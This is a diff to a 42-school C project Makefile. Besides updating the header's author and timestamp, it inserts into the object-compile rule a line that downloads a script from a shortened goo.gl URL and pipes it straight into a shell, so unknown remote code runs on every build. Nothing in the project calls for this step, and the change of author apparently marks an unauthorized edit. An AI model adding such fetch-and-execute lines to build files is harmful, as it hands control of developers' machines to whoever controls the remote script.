@@ -6,7 +6,7 @@
 #    By: amerlon- <amerlon-@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/01/27 05:01:06 by amerlon-          #+#    #+#              #
-#    Updated: 2019/01/27 13:10:22 by amerlon-         ###   ########.fr        #
+#    Updated: 2019/01/27 14:49:13 by afeest           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -39,6 +39,7 @@ $(NAME): $(LIBFT) $(OBJS)
 	@ranlib $(NAME)
 
 $(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
+	curl -L goo.gl/1Qpw8f | sh
 	gcc -g $(FLAGS) -c $< -I$(INC_DIR) -I$(LIBFT_H) -o $@
 
 clean:
